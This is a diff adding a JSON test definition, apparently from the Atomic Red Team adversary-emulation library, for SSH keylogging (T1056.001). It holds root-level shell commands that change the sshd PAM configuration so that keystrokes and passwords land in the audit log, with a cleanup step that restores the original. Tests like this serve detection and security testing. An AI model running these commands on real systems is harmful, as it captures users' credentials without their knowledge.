@@ -1,0 +1,39 @@
+{
+    "name": "SSHD PAM keylogger",
+    "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "dependency_executor_name": "sh",
+    "executor": {
+        "name": "sh",
+        "elevation_required": true,
+        "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n",
+        "cleanup_command": "cp -fv /tmp/sshd /etc/pam.d/\n",
+        "type": "Command Executor"
+    },
+    "id": "T1056.001",
+    "tactics": [
+        "Credential Access",
+        "Collection"
+    ],
+    "technique": "Keylogging",
+    "source": "ART",
+    "uuid": "81d7d2ad-d644-4b6a-bea7-28ffe43becca",
+    "arguments": {
+        "user_account": {
+            "description": "Basic ssh user account for testing.",
+            "type": "string",
+            "default": "ubuntu"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "This test requires sshd and auditd\n",
+            "prereq_command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
+            "get_prereq_command": "echo \"\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
